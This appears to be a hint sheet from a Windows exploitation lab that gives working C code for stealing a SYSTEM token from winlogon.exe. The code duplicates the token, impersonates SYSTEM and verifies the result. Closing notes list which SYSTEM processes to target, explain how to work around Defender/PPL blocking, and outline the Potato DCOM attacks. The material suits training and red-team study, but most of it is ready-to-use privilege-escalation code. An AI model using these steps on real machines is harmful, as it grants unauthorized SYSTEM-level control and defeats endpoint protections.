=== HINT 1: Find target process ===
DWORD pid = find_process("winlogon.exe");

=== HINT 2: Open and steal token ===
HANDLE hProc  = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hToken = NULL;
OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken);
CloseHandle(hProc);

=== HINT 3: Duplicate token ===
HANDLE hDupToken = NULL;
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
    SecurityImpersonation, TokenImpersonation, &hDupToken);
CloseHandle(hToken);

=== HINT 4: Impersonate ===
ImpersonateLoggedOnUser(hDupToken);
// Now current thread is SYSTEM

=== HINT 5: Verify + revert ===
char user[128]; DWORD len = sizeof(user);
GetUserNameA(user, &len);
printf("impersonating: %s\n", user);  // "SYSTEM"
RevertToSelf();

=== KEY INSIGHT ===
TokenImpersonation: only current thread is affected.
CreateProcessWithTokenW: launch a new process as the token's user (requires SeAssignPrimaryTokenPrivilege).
Token types:
  Primary token: assigned to processes at creation.
  Impersonation token: assigned to threads (used for impersonation).
Common SYSTEM processes: winlogon, lsass, services, spoolsv.
Defender/PPL may block OpenProcess on some targets - try other SYSTEM processes.
Potato attacks (Juicy, Rotten, Sweet): abuse DCOM impersonation to steal SYSTEM token
  from a service that connects back to an attacker-controlled COM server.
